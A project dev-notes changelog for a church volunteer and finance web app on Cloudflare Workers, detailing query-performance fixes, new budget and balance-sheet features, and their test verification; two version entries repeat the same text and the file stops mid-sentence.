# Dev Notes — Volunteer / ChMS App

This file is checked at the start of every debugging or improvement session.
Update it as issues are found, fixed, or queued.

---

## Architecture Quick Reference

- **Runtime**: Cloudflare Workers + D1 (SQLite at the edge)
- **Entry point**: `tlc-volunteer-worker.js` → routes to `src/api-chms.js` (people/giving/import) and other handlers
- **Frontend**: `chms-admin.html` + `src/html-chms.js` (rendered server-side as a single HTML string)
- **Auth**: role-based — `admin | finance | staff | member`
- **Breeze ChMS API base URL**: `https://<BREEZE_SUBDOMAIN>.breezechms.com/api/`

### Key Breeze API quirks
- `/api/profile` returns field definitions; the `id` on a field is NOT the key used in a person's `details` object — use `field_id` instead.
- `/api/people?details=1` returns people with a `details` object keyed by `field_id` values.
- DOB may live at `person.birth_date` (top-level) OR `details['birthdate']` (literal key) rather than under a numeric field ID.
- The built-in person-type field ID is `1076274773`; values `1=Member, 2=Attender, 3=Visitor`.
- `fk(field)` helper: `String(field.field_id || field.id)` — always use this to get the detail lookup key.

---

## Recent Changes

### v1.227.0 — Finance tab query amplification: 12 giving scans per click down to 2 per year (2026-09-05)

Reported after a Cloudflare investigation: `tlc-volunteer-db` passed the D1 free-tier row-read
ceiling on 2026-09-04 and unrelated church APIs started returning errors. The trailing-window
top-four queries were all one year of `giving_entries`, roughly 6.2M row reads between them:
household giving bands (106 executions / 2.15M rows), fund totals (75 / 1.53M), monthly giving by
fund (74 / 1.39M), distinct giving households (60 / 1.12M). Verified against this repo before
changing anything — every one of those four is a query in `finance/church/this-year`, and the
execution counts are the product of three multipliers stacked on each other:

1. **Every section click reloaded every section.** Switching Finance sub-nav goes through
   `showTab('finance', …)`, which called `loadFinance()`, which called all seven section loaders
   unconditionally — Balance Sheet, Daycare, Property, Budget and the rest, whether or not the
   reader could see them.
2. **Three of those loaders each fetched `finance/church/this-year` independently** — Financial
   Health, Church Report and Budget — so one click was three requests for the same year.
3. **That one payload scanned `giving_entries` four times**, and `giving_entries` had no index on
   `contribution_date` at all (only `batch_id`, `person_id`, `breeze_id`, `deposit_id`), so each
   scan read every year of giving ever recorded in order to report one.

3 × 4 = twelve full-table giving aggregations per sub-nav click. All three multipliers are fixed:

- **Only the visible section loads** (`finEnsureSection` / `FIN_SECTION_LOADERS`,
  `src/frontend/js-finance.js`). `loadFinance()` now does one cheap bootstrap (status, QuickBooks
  snapshot, daycare entries — none touch giving) and hands off to the active section; re-entering
  the tab reuses it. Budget, Compensation and Chart of Accounts share one entry because they share
  one fetch. **Three real cross-screen data dependencies had to be untangled first**, or lazy
  loading would have silently emptied screens that used to be filled as a side effect of a tab the
  reader never opened: Financial Health reads the Ivanhoe property payload (entity/lever/decision
  cards) and the daycare year aggregate, and Budget's Ivanhoe forecast card reads the same property
  payload. Property is now a shared promise-cached prerequisite (`finEnsurePropertyData`), and the
  daycare aggregate is a computation (`finEnsureDaycareAgg`) rather than a side effect of the
  Daycare panel having rendered.
- **One request per year across screens** (`finFetchChurchYear`). Deliberately a per-year memo and
  not a session cache with a TTL — `finRenderChurchReport()`, which is the after-an-import refresh
  path, clears it and marks Health and Budget for reload, so no screen shows a figure a completed
  import has already superseded.
- **Two giving scans per request, not four** (`buildChurchThisYear`, `src/api-finance.js`). The
  per-fund annual totals are summed in JS from the month-by-fund rows already read (skipping a
  `fund_id` with no row in `funds`, which preserves the INNER JOIN the separate query did), and the
  giving-household count is the row count of the same per-household aggregate the donor bands are
  bucketed from.
- **Concurrent identical requests share one computation** (`coalesceChurchYear`). The map holds
  only genuinely in-flight promises — each entry is deleted the moment its computation settles —
  so this is request coalescing, never a cache: a read starting after a write has finished always
  recomputes. A test pins that distinction.
- **Two covering indexes on `contribution_date`** (migration `0042`, plus the runtime migrations
  array in `src/db.js`). ⚠ These belong in that array and **not** in `DB_INIT`: `contribution_date`
  is itself added by an `ALTER` in the migrations array, so `DB_INIT` runs before the column exists
  and index creation fails with "no such column: contribution_date" on a fresh database. Caught by
  `test/migration-error-visibility.test.js`, not by reading.

**Measured, not assumed.** `EXPLAIN QUERY PLAN` against a realistic 8-year, ~42k-row fixture, on
the exact SQL as shipped: both remaining queries went from `SCAN ge` to
`SEARCH ge USING COVERING INDEX` — the index range, not the table, and no table lookup at all. On
that shape one year is an eighth of the table, so per report that is roughly an 8× cut on top of
the 4→2 scan reduction and the 3→1 request reduction.

`npm test` (2169/2169, 14 new in `test/finance-query-amplification.test.js` — the real route
against real in-memory SQLite with a query-counting DB stub, and the real assembled bundles run in
a `vm` with `fetch` stubbed, since `api()` is defined inside `js-core.js` and cannot be stubbed
from the sandbox). **Every new test verified non-vacuous** by injecting the exact regression it
guards — 6 injections, 6 correct failure sets. Two of my own assertions were wrong and were
corrected rather than forced: the expected per-fund ordering, and an assertion that reopening
Financial Health after an import must issue a new request (it must not — the import's own refresh
already fetched that year, and Health correctly rebuilds from it). `node --check` on all touched
files and all three assembled bundles; div balance on `CHMS_HTML` (1123/1123) and brace balance on
the CSS bundle (1373/1373); spelling check clean. DEPLOY_VERSION bumped to 1.227.0.
**Not verified**: a live browser, or the live D1 row-read counters after deploy — the acceptance
check is Cloudflare's own trailing-window numbers for `tlc-volunteer-db` once this ships.
(`src/api-finance.js`, `src/db.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`,
`migrations/0042_giving_contribution_date_indexes.sql`, `test/finance-query-amplification.test.js`)

### v1.226.0 — Purpose tags: a second, optional lens over Compensation workers and accounts (2026-09-05)

Asked as an exploratory question, not a build request: "What about having tagging budget lines in
a secondary way? So that we could also view it based on youth, mission, internal. So I could tag
the DCE for youth and music director for music and it would show how much resources are going each
way not just categories." Scoped it first (a recommendation + the main tradeoff, per this session's
own convention), confirmed with the user: single-tag-only for now, split by percentage deferred.

- **Two tag surfaces, because "the DCE"/"the music director" names a person, not a GL line.**
  Compensation Planner roster workers get a `purposeTag` field stored directly on the roster row
  (saved through the existing salary-planner endpoint — no new backend plumbing for that half);
  Chart of Accounts leaf accounts get an entry in a new `categories` map. Deliberately NOT a
  server-side map keyed by a worker's `accountCode` — a worker can have no budget line entered at
  all, and keying by account code either leaves them untaggable or tags every blank-code worker
  identically.
- **New `finance_planning_purpose_tags` chms_config store** (`GET`/`PUT
  /admin/api/finance/planning/purpose-tags`) holding the shared, admin-managed tag list (add/
  rename/delete, ids minted from the label) plus the Chart of Accounts assignments — independent
  of `finance_planning_board_categories`, whose category set is a fixed 7-key allowlist rather than
  an open-ended managed list.
- **Deleting a tag cleans up both stores**: the backend drops any stale `categories` entry, and the
  frontend separately clears the field off any roster worker still carrying it, then schedules the
  existing roster autosave.
- **New UI**: a "Purpose Tags" card + a per-leaf picker on Chart of Accounts (shown only once a
  tag exists), a matching picker on the Compensation drawer, and a "Resources by Purpose" report
  card summing each tag's tagged workers' full church cost plus tagged accounts' actual dollars —
  with a double-count guard so tagging both a worker and the exact GL line their salary posts to
  never counts the same dollars twice.
- `npm test` (2155/2155, 28 new); every new test verified non-vacuous (27 of 28 fail against the
  pre-change code). A backtick in a new comment closed the outer `String.raw` literal — caught by
  the test suite's parse failure. `node --check` on all five bundles; div-balance unchanged
  (1123/1123 — no new static markup). DEPLOY_VERSION → 1.226.0. **Not verified**: a live browser.
  (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`,
  `test/finance-planning-purpose-tags.test.js`)

### v1.225.0 — Balance Sheet & Financial Position is its own tab (2026-09-04)

Two asks in one message: "give me a tab for Balance Sheet & Financial Position... graphs of
data... show the change over the years of growth or loss of money, like compared to our bank
accounts over the years," followed shortly by "i need a report that can compare last years to
this year." Balance Sheet already existed — as a third mode inside Church Report's This
year/Multi-year toggle, with a multi-year Assets/Liabilities/Equity chart and a tie-out against
the income statement (FIN60) — but had no dedicated tab, no cash-specific trend, no CSV export,
and no account-level year-over-year comparison.

- **Moved out of Church Report into its own top-level Finance sub-nav tab** (`FIN_TOPNAV_ITEMS`,
  right after Church Report). Church Report's mode pills drop from three to two (This year /
  Multi-year); the balance-sheet DOM mount, state, and functions relocate from
  `#fin-church-balances-view` (nested inside Church Report's panel) to a single `#fin-balance-root`
  mount in its own `#fin-panel-balance` panel, matching the Property/Planning tabs' one-root-mount
  pattern. Every reading-side identifier renamed accordingly (`finLoadChurchBalances` →
  `finLoadBalanceSheetTab`, `finRenderChurchBalances` → `finRenderBalanceSheetTab`, etc.) — the
  Data & Imports upload-flow state (`_finChurchBalanceImportPreview`, etc.) is untouched and stays
  on Data & Imports, per FIN57's own reasoning that a file-upload control has no business on a
  reading page.
- **"Cash & Bank Accounts Over Time" trend chart** (new). Two series: the one pinned operating
  checking account (Data & Imports → Classification & policy → Operating cash account code — the
  same figure the Financial Health runway card reads, via the shared
  `operatingCashFromBalanceSheet()`, so the two can never quote different numbers for the same
  year) and a broader "All Cash & Bank Accounts" figure sweeping in every other
  checking/savings/money-market/petty-cash-named account, since a church with more than one bank
  account (a daycare's own checking, say) would otherwise have that second account invisible.
  Backend: new `computeYearCashSummary()` in `api-finance.js`, wired into the existing
  `GET /admin/api/finance/church/balances/multi-year` response as `cashByYear`/`cashAccountCode` —
  no new route.
- **"Net Worth Growth by Year" table** (new) — a plain signed $ and % change table between every
  consecutive pair of years already in the multi-year Equity series, so "did we grow or lose
  ground" reads as a number with a sign on it, not just a bar chart to eyeball.
- **"This Year vs. Last Year" account-by-account comparison** (new) — directly answers "i need a
  report that can compare last years to this year." Every account on the current year's balance
  sheet, walked against the same account's prior-year total (`finBalanceTotalsByPath()`), with $
  and % change per line; an account with nothing on the books last year reads "new this year"
  rather than a misleading $0.00 prior figure. Needed a third fetch (`finLoadBalanceSheetTab` now
  also requests `year - 1`'s single-year snapshot) alongside the existing current-year and
  multi-year-trend calls.
- **CSV export** (new) — `finExportBalanceCsv()`, the full loaded multi-year Assets/Liabilities/
  Equity/Cash series, not just the on-screen snapshot year.
- `npm test` (2127/2127, 30 new/updated across `test/finance-balance-pnl-recon.test.js` — the real
  backend route against real in-memory SQLite, including a new `computeYearCashSummary` unit-test
  block — and `test/finance-balance-recon-ui.test.js` — the real render functions driven out of
  the real assembled bundles via the established vm-behind-a-stub-DOM technique). **Every new/
  dependent test verified non-vacuous** by stashing all four touched source files and confirming
  28 of 40 tests in the two files fail against the pre-change code (the other 12 correctly still
  pass, since they don't depend on this change). One pre-existing test file
  (`finance-balance-pnl-recon.test.js`) needed a `chms_config` table added to its minimal
  in-memory schema, since the multi-year route now also calls `readCashPolicy()`. `node --check`
  on `api-finance.js` and all three assembled bundles; div-balance on the assembled `CHMS_HTML`
  (1123/1123). DEPLOY_VERSION bumped to 1.225.0. **Not verified**: a live browser.
  (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`,
  `src/frontend/html-tabs.js`, `test/finance-balance-pnl-recon.test.js`,
  `test/finance-balance-recon-ui.test.js`)

### v1.224.0 — Budget tab: Worship & Music and District & Synod Support are now their own board categories (2026-09-04)

Reported live: "we lost the categories of 'Worship & Music' and 'District & Synod Support'." Real,
predictable consequence of v1.222.0's Board view becoming the Budget tab's default — before that,
the tab only ever showed the raw QuickBooks-order tree, which preserves whatever group headings
the real chart of accounts carries; Board view's fixed 5-category system (MDO / Salaries &
Benefits / Property & Operations / Lutheran Education / Programs) has no room for a category that
isn't one of those five, so any expense account matching neither MDO nor Salaries nor Property nor
Education fell into one undifferentiated "Programs" bucket — the dollar figure was still there,
just with no heading of its own calling it out. Asked the user how they wanted it resolved
(`AskUserQuestion`, since this is a real board-taxonomy decision, not a display nicety) rather than
guess between "add sub-headings within Programs" and "give them their own top-level category" —
**user chose the latter.**

- **Two new board expense categories**, worship (`Worship & Music`) and district_synod
  (`District & Synod Support`), inserted into `FIN_BOARD_EXP_ORDER`
  (`mdo, salaries, worship, property, education, district_synod, programs`) alongside new default
  regexes in `FIN_BOARD_EXP_RULES` (`worship|music|choir|organist|liturg|hymn` and
  `district|synod`, both tested before the now-narrower `programs` catch-all, which no longer
  matches `worship|music` itself). Chart of Accounts and the Budget tab's Board view both read
  `FIN_BOARD_EXP_ORDER` generically, so no other frontend rendering code needed to change — the
  two new categories just appear as two more cards/headings, same as the existing five.
- **⚠ The backend validation for this store used to reuse `FLOW_EXPENSE_KEYS`** — the money-flow
  Sankey diagram's OWN, separate 5-category allowlist (Financial Health page, FIN58) — purely
  because the two systems happened to share the same 5 keys since FIN70 shipped. Growing Board's
  categories to 7 while still validating against `FLOW_EXPENSE_KEYS` would have either rejected
  every attempt to assign an account to `worship`/`district_synod` (400 Invalid expense category),
  or, if `FLOW_EXPENSE_KEYS` had been extended instead, silently grown the Sankey diagram from 5
  categories to 7 too — a heavily-tested, board-facing chart nobody asked to change, with no live
  browser here to re-verify a shape change against. Fixed by giving the Board Category system its
  own independent allowlist, `BOARD_EXPENSE_CATEGORIES`/`BOARD_EXPENSE_KEYS` (`src/api-finance.js`)
  — `FLOW_EXPENSE_CATEGORIES`/`FLOW_EXPENSE_KEYS`/`classifyFlowExpense()` (the Sankey's own system)
  are completely untouched, confirmed by grep still gating only its own routes.
  `BOARD_EXPENSE_KEYS`/`FIN_BOARD_EXP_ORDER` are two independent lists (backend/frontend) kept in
  sync by hand, same as `FIN_BOARD_REV_ORDER`/`REVENUE_STREAMS` already were.
- Fixed one piece of now-inaccurate copy on the Chart of Accounts page — its Expenses card
  subtitle used to say "the same ones the money-flow chart is drawn from," which stops being true
  the moment the two systems' category counts diverge.
- `npm test` (2104/2104, 4 new: a board-only-categories acceptance test in
  `test/finance-planning-board-categories.test.js`, and a dedicated `finBuildBoardTree` test in
  `test/finance-planning-chart-of-accounts.test.js` confirming both new categories render as their
  own top-level heading and Programs no longer catches either). **Every new test verified
  non-vacuous** by stashing the two source files and confirming all 3 dependent tests fail against
  the pre-change code, then restoring. `node --check` on `api-finance.js` and all three assembled
  bundles (`app-core.js`/`app-ext.js`/`app-finance.js`). DEPLOY_VERSION bumped to 1.224.0.
  **Not verified**: a live browser. (`src/api-finance.js`, `src/frontend/js-finance.js`,
  `test/finance-planning-board-categories.test.js`, `test/finance-planning-chart-of-accounts.test.js`)

### v1.220.0 — Chart of Accounts page; Board view / QuickBooks order toggle on Planning (2026-09-04)

Built from a Claude Design canvas handoff (`design_handoff_budget_planning_categorization`,
mockups for `Chart of Accounts.dc.html` and `Budget Planning.dc.html`, recreated from this repo's
own shipped source) — the ask was to add per-account category assignment and a new Chart of
Accounts page to the Planning tab. A new independent classification system, deliberately NOT the
existing group-label-only `finance_revenue_streams`/`finance_flow_expense_map` stores that
Financial Health's revenue mix bar and the money-flow Sankey diagram already read (those are
heavily tested and board-facing with no live browser to re-verify a shared-store regression
against) — new `finance_planning_board_categories` chms_config blob, keyed by each real leaf
account's own `category_path` rather than a QuickBooks GROUP label, so two funds sharing a group
can land in different board categories.

- **New `GET`/`PUT /admin/api/finance/planning/board-categories`** (`src/api-finance.js`). GET
  returns `{revenue, expense, revenueLabels, expenseLabels}` (all four default to `{}` on a fresh
  install, so every reader tolerates an unset map as "everything is on its regex default"). PUT
  (admin-only, read is open to any finance-gated caller) MERGES whatever's sent into what's already
  saved, so a per-leaf pick made from Planning's own inline picker and a bulk "Move to" made from
  Chart of Accounts land in the same store without one clobbering the other's unrelated entries.
  Every revenue value is checked against `REVENUE_STREAMS`, every expense value against
  `FLOW_EXPENSE_KEYS` — an unrecognized key 400s rather than silently storing garbage a renderer
  would then guess at. An empty-string value clears that one entry back to the computed default,
  and a blank rename clears a custom category label the same way.
- **New Chart of Accounts page** (`src/frontend/js-finance.js` `finRenderChartOfAccounts()`, new
  sub-nav item between Planning and Compensation, mounted at `#fin-panel-accounts`/`#fin-coa-root`
  in `html-tabs.js`) — two cards (Revenue / Expenses), each account grouped under its current
  category with a per-account checkbox + picker, a group-level "select all in this category"
  checkbox, a renameable (contenteditable) category heading, and a bulk "Move to" bar that appears
  once anything is selected on that card. Every write saves immediately (a checkbox tick, a picker
  change, a bulk move, a rename) — deliberately not a batched "Save changes" button; every other
  admin-editable control already on this tab (Planning's own per-leaf picker, Settings' Fund
  Categories card) already saves on change with no separate commit step, and a page whose entire
  job is "reassign a few accounts" gains nothing from a save queue someone could navigate away from
  and lose. Footer states plainly that nothing here touches `category_path`, fund numbers, or
  QuickBooks itself — the next sync/import lands in exactly the same accounts regardless.
- **Board view / QuickBooks order toggle on Planning's "Category by category" table.** New
  `finBuildBoardTree(_finPlanBaseTree)` flattens the real QuickBooks tree to leaves
  (`finFlattenLeaves`) and re-buckets them fresh by the Chart of Accounts categories — a genuinely
  new capability for EXPENSES, which had zero categorization before this; revenue already had a
  partial version of this via `finReorganizeChurchTree`'s Earned/Restricted extraction, now folded
  into the same mechanism. Restricted giving nests under one "Donor Income" wrapper alongside
  Unrestricted, matching `displayStreamOf()`'s convention everywhere else in this app that restricted
  reads as the second half of donor income, not a fourth stream beside it — that wrapper title is a
  fixed organizational header, never one of the four renameable category keys. **Board view is the
  new default**; "QuickBooks order" is the tree exactly as it rendered before this shipped
  (`finReorganizeChurchTree`'s own grouping over the raw QuickBooks hierarchy), unchanged, so
  flipping the toggle back always shows what the page looked like before Chart of Accounts existed.
  An unmatched account defaults to Earned Income (revenue) or Programs (expense) — never
  Unrestricted Gifts — same reasoning as `REVENUE_STREAM_RULES` in `api-finance.js`: overstating
  donor revenue overstates how much of the budget the board can actually redirect, which is the one
  thing this page exists to get right.
- **Column show/hide chips** (FY Bud / FY Actual / FY Projected / FY Plan / Δ%) — a hidden column's
  chip stays visible, struck through, so it can be turned back on; only its `<th>`/`<td>`s actually
  leave the table.
- **"Choose rows"** — an admin can exclude individual lines from the table; **a total (group,
  section, or Net) always reads the exclusion-filtered tree whether or not picking is currently
  open**, so a printed sheet or export built from the same state can never disagree with what's on
  screen. While picking is open, an excluded leaf still renders (dimmed, checkbox unchecked, so it
  can be put back) — showing its own real value, never zeroed — but is never counted in a total.
  Not persisted server-side: a print/export exclusion is a "leave this off THIS sheet" choice, not a
  standing Chart of Accounts decision, so it resets on reload rather than following the church into
  next year's plan.
- **Export CSV** — `finPlanExportCsv()` downloads `_finPlanCsvRows`, a table built alongside the
  HTML on every render (not a second computation) so the export can never drift from what's on
  screen — respects the current column visibility and row exclusion exactly.
- **Print** — `finPlanPrint()` sets `body.printing-plan` (same `body.printing-<feature>` contract as
  `.printing-comp`/`.printing-board`), showing only `#fin-plan-print-card` (the table itself) — the
  navy summary strip, the year-input/commit header actions, and the five-year outlook chart below
  the table are working-session controls, not part of a sheet handed to a board member. No separate
  print-only layout to build, unlike the Council report — the table already lives on the page.
- **Per-leaf category picker directly on Planning** (Board view, admin only) — reassigns one
  account's category from the row it's actually sitting in, via the same
  `finPlanSetBoardCategory()`/`finCoaSaveCategories()` save path Chart of Accounts uses, so the two
  surfaces can never disagree about which store wins.
- **Deliberately not built this pass** (scope kept to what the handoff's core ask needed): a
  "moved" indicator badge on a reassigned account, inline category-header renaming on Planning
  itself (kept on Chart of Accounts only), and a batched "Save changes" step on Chart of Accounts
  (immediate-save-per-action instead, per the reasoning above).
- **A real bug in my own draft, caught by the build, not by reading**: a backtick inside a comment
  ("… category_path is in `excluded`") closed the outer `String.raw` literal and broke the entire
  served script — the SC3-BUG1/FIN15/TAP2-BUG class this file has hit repeatedly. Caught by running
  the actual assembled bundle through Node, not by `node --check` on the module file alone (which
  only validates the outer template literal's own delimiters, not the served text inside it).
- `npm test` (2056/2056, 43 new across `test/finance-planning-board-categories.test.js` — the real
  backend route against real in-memory SQLite — and `test/finance-planning-chart-of-accounts.test.js`
  — the real assembled `CHMS_APP_CORE_JS`+`CHMS_APP_EXT_JS`+`CHMS_APP_FINANCE_JS` bundles run in a
  `vm`, driving `finBuildBoardTree`, the Board-view/QuickBooks-order toggle, column visibility, row
  exclusion/totals-consistency, CSV export, every Chart of Accounts handler including the real
  fetch-backed saves, and `finPlanPrint`). **Every new test verified non-vacuous** by injecting the
  exact regression it guards directly into the production code and confirming the right test (and
  only that test) failed — 8 injections across both files, 8 correct failure sets. One injection
  (removing `finRecomputeTreeTotals()` from `finPlanFilterExcluded`) caused **no** test failure —
  traced to `finPlanComputeMaps()` never actually reading a group node's own stale
  `totalActualCents`/`totalBudgetCents` fields, only ever summing from its own bottom-up maps; left
  the call in place as harmless defensive code (matches the surrounding comment's stated intent) but
  didn't write a test claiming to cover it, since nothing currently observable depends on it. Two of
  my own test assertions were wrong on the first pass and were corrected against the real rendered
  output rather than forced: a toolbar CHIP for a hidden column stays in the DOM (struck through, so
  it can toggle the column back on) rather than disappearing, which I'd initially asserted backwards;
  and an admin's Actual cell renders as an editable `value="50000"` input, not the comma-formatted
  text a non-admin sees. Three pre-existing tests in `test/finance-qb-order.test.js` needed updating,
  not the production code — they render the Planning table directly and never set
  `_finPlanViewMode`, so once Board view became the default they were silently exercising the wrong
  tree; fixed by having those two helpers explicitly force `_finPlanViewMode = 'qb'`, matching what
  their own describe block ("Planning budget builder — QuickBooks order") already says they're
  testing. Plus `node --check` on all four touched source files and both extracted bundle scripts,
  and a div/tag-balance scan of the fully assembled `CHMS_HTML` (1122/1122) and its extracted CSS
  bundle (1373/1373 braces). One pre-existing, unrelated test failure
  (`test/finance-property-funds-itself.test.js`'s "deducts mortgage principal") was confirmed present
  on the branch before this session's changes too (a date-sensitive amortization fixture, not
  touched by anything here) — not fixed, out of scope. **Not verified**: a live browser.
  (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`,
  `src/frontend/html-tabs.js`, `src/frontend/html-head.js`,
  `test/finance-planning-board-categories.test.js`, `test/finance-planning-chart-of-accounts.test.js`,
  `test/finance-qb-order.test.js`)

### v1.223.0 — Budget tab follow-ups: renamed from Planning, headings editable in place, per-leaf picker removed (2026-09-04)

Three live-screenshot follow-ups on FIN70 (Chart of Accounts / Board view, PR #813, just merged).

1. **"Planning" renamed to "Budget"** everywhere it's shown to a user — the sidebar sub-nav
   label, the page header ("Budget FY2027"), and every user-facing sentence that named the tab
   (the Data & Imports danger-zone copy, Chart of Accounts' own empty-state and footer note, the
   Compensation tab's "sent to the Budget" message, the base-year proration tooltip). The `id`/
   `finSection`/route (`planning`), every function name (`finRenderPlanning`, `finLoadPlanning`,
   `_finPlanViewMode`, etc.) and the endpoint paths are all untouched — this is a display-string
   rename only, so nothing that persists or gets looked up by name had to migrate.
2. **The category headings on the Budget tab's own Board view are now editable in place** —
   "Unrestricted Gifts," "Donor Income," "Salaries & Benefits," etc. — the same rename control
   Chart of Accounts already offered, reachable from either screen, writing to the same
   `finance_planning_board_categories` store either way. **The "Donor Income" wrapper needed a
   new field to be renameable at all**: it isn't one of the four category keys
   (`REVENUE_STREAMS`) the store already validates against — it's the purely organizational node
   that nests Unrestricted + Restricted together (see `finBuildBoardTree`) — so it gets its own
   plain-string `donorWrapperLabel` field, trimmed server-side, blank clears back to the default
   "Donor Income." `finTreeLabelCell()` gained an `opts.html` escape hatch (an editable span the
   caller already `esc()`'d, used verbatim instead of double-escaping) — every existing caller
   that doesn't pass it keeps the old plain-`esc(label)` behavior unchanged.
3. **The per-leaf category `<select>` on the Budget table itself is gone.** It was a second copy
   of the exact same control Chart of Accounts already offers — the user's own framing was that
   reassigning an account is Chart of Accounts' job, and having the same dropdown appear a second
   time on the Budget table (which is what the screenshot showed) was confusing, not a second
   convenience. `finPlanSetBoardCategory()` itself is untouched and still backs Chart of
   Accounts' own per-leaf `<select>` — only the Budget table's copy of the call site is gone.

`npm test` (2102/2102, 12 new/updated across `test/finance-planning-board-categories.test.js` and
`test/finance-planning-chart-of-accounts.test.js`); **every changed/new assertion verified
non-vacuous** by stashing the `js-finance.js` change and confirming all 5 dependent frontend tests
fail against the pre-change code (the two board-categories default-shape tests were already
directly falsified by the new `donorWrapperLabel` field, confirmed the same way). `node --check`
on all three touched files and the fully assembled served bundle (`CHMS_APP_CORE_JS`+
`CHMS_APP_EXT_JS`+`CHMS_APP_FINANCE_JS`), div-balance on the assembled `CHMS_HTML` shell
(1122/1122), and the repo's own American-English spelling check (clean). DEPLOY_VERSION bumped to
1.223.0. **Not verified**: a live browser. (`src/api-finance.js`, `src/frontend/js-finance.js`,
`src/frontend/js-core.js`, `test/finance-planning-board-categories.test.js`,
`test/finance-planning-chart-of-accounts.test.js`)

### MKT2 — Christmas Market signup open/close, from the website admin (2026-08-31)

The write twin of MKT1 below. Dinger, on the website repo's read-only Volunteers
tab: he wanted a toggle there to also control whether Serve is taking market
volunteer sign-ups — which, until now, could only be set from this app's own
Scheduler screen (connect.timothystl.org/#volunteers). Backend only, same
reasoning as MKT1: no frontend change, `DEPLOY_VERSION` not bumped.

- **New `POST /api/signups/christmasmarket/toggle`, `{ "open": true|false }`**,
  in `src/api-scheduler.js` beside `handleChristmasMarketSummary` — same event
  lookup (`slug='christmasmarket'`, falling back to `name='Christmas Market'`),
  same shared-secret auth (`X-Intake-Key` / `CHMS_INTAKE_API_KEY`), same
  server-to-server-only shape (no CORS headers). It is the one other door onto
  `serve_events.hidden` for this event — the same column the Scheduler screen's
  own checkbox already writes, and the same column `handleSignup()` already
  refuses a public sign-up against ("Registrations for this event are currently
  on hold"). Nothing about what "closed" means changed; only who else can set it.
- **⚠ A missing event is 404, not a silent no-op or a fabricated row.** The
  market's Serve event might genuinely not be set up yet for the season — the
  caller (the website repo's admin) needs to say so in plain words rather than
  claim success or invent a placeholder event to toggle.
- **`{ open }` in the body, not a header or a query string** — matches the shape
  the website repo's own toggle already posts for its local `has_volunteers`
  flag, so the one call it makes carries one clear boolean.
- **Routed above the `/api/*` Breeze-proxy catch-all**, same trap
  `/api/signups/christmasmarket/summary` is already worked around for — and
  added to `isSchedCorsPath()`'s early-`false` list beside it, since this is
  also never called from a browser.
- `npm test` (2029/2029, 9 new in `test/market-signup-summary.test.js` — refusal
  without/with a wrong key, 503 with no key configured, 400 on malformed JSON or
  a non-boolean `open`, 404 with no event, closing, reopening, the by-name
  fallback, and a round trip through the summary route itself confirming the two
  routes agree). **Not verified**: a live call from the website Worker — see
  that repo's own CLAUDE.md for the caller side of this.
  (`src/api-scheduler.js`, `tlc-volunteer-worker.js`, `test/market-signup-summary.test.js`)

### v1.222.0 — Chart of Accounts page; Board view / QuickBooks order toggle on Planning (2026-09-04)

Built from a Claude Design canvas handoff (`design_handoff_budget_planning_categorization`,
mockups for `Chart of Accounts.dc.html` and `Budget Planning.dc.html`, recreated from this repo's
own shipped source) — the ask was to add per-account category assignment and a new Chart of
Accounts page to the Planning tab. A new independent classification system, deliberately NOT the
existing group-label-only `finance_revenue_streams`/`finance_flow_expense_map` stores that
Financial Health's revenue mix bar and the money-flow Sankey diagram already read (those are
heavily tested and board-facing with no live browser to re-verify a shared-store regression
against) — new `finance_planning_board_categories` chms_config blob, keyed by each real leaf
account's own `category_path` rather than a QuickBooks GROUP label, so two funds sharing a group
can land in different board categories.

- **New `GET`/`PUT /admin/api/finance/planning/board-categories`** (`src/api-finance.js`). GET
  returns `{revenue, expense, revenueLabels, expenseLabels}` (all four default to `{}` on a fresh
  install, so every reader tolerates an unset map as "everything is on its regex default"). PUT
  (admin-only, read is open to any finance-gated caller) MERGES whatever's sent into what's already
  saved, so a per-leaf pick made from Planning's own inline picker and a bulk "Move to" made from
  Chart of Accounts land in the same store without one clobbering the other's unrelated entries.
  Every revenue value is checked against `REVENUE_STREAMS`, every expense value against
  `FLOW_EXPENSE_KEYS` — an unrecognized key 400s rather than silently storing garbage a renderer
  would then guess at. An empty-string value clears that one entry back to the computed default,
  and a blank rename clears a custom category label the same way.
- **New Chart of Accounts page** (`src/frontend/js-finance.js` `finRenderChartOfAccounts()`, new
  sub-nav item between Planning and Compensation, mounted at `#fin-panel-accounts`/`#fin-coa-root`
  in `html-tabs.js`) — two cards (Revenue / Expenses), each account grouped under its current
  category with a per-account checkbox + picker, a group-level "select all in this category"
  checkbox, a renameable (contenteditable) category heading, and a bulk "Move to" bar that appears
  once anything is selected on that card. Every write saves immediately (a checkbox tick, a picker
  change, a bulk move, a rename) — deliberately not a batched "Save changes" button; every other
  admin-editable control already on this tab (Planning's own per-leaf picker, Settings' Fund
  Categories card) already saves on change with no separate commit step, and a page whose entire
  job is "reassign a few accounts" gains nothing from a save queue someone could navigate away from
  and lose. Footer states plainly that nothing here touches `category_path`, fund numbers, or
  QuickBooks itself — the next sync/import lands in exactly the same accounts regardless.
- **Board view / QuickBooks order toggle on Planning's "Category by category" table.** New
  `finBuildBoardTree(_finPlanBaseTree)` flattens the real QuickBooks tree to leaves
  (`finFlattenLeaves`) and re-buckets them fresh by the Chart of Accounts categories — a genuinely
  new capability for EXPENSES, which had zero categorization before this; revenue already had a
  partial version of this via `finReorganizeChurchTree`'s Earned/Restricted extraction, now folded
  into the same mechanism. Restricted giving nests under one "Donor Income" wrapper alongside
  Unrestricted, matching `displayStreamOf()`'s convention everywhere else in this app that restricted
  reads as the second half of donor income, not a fourth stream beside it — that wrapper title is a
  fixed organizational header, never one of the four renameable category keys. **Board view is the
  new default**; "QuickBooks order" is the tree exactly as it rendered before this shipped
  (`finReorganizeChurchTree`'s own grouping over the raw QuickBooks hierarchy), unchanged, so
  flipping the toggle back always shows what the page looked like before Chart of Accounts existed.
  An unmatched account defaults to Earned Income (revenue) or Programs (expense) — never
  Unrestricted Gifts — same reasoning as `REVENUE_STREAM_RULES` in `api-finance.js`: overstating
  donor revenue overstates how much of the budget the board can actually redirect, which is the one
  thing this page exists to get right.
- **Column show/hide chips** (FY Bud / FY Actual / FY Projected / FY Plan / Δ%) — a hidden column's
  chip stays visible, struck through, so it can be turned back on; only its `<th>`/`<td>`s actually
  leave the table.
- **"Choose rows"** — an admin can exclude individual lines from the table; **a total (group,
  section, or Net) always reads the exclusion-filtered tree whether or not picking is currently
  open**, so a printed sheet or export built from the same state can never disagree with what's on
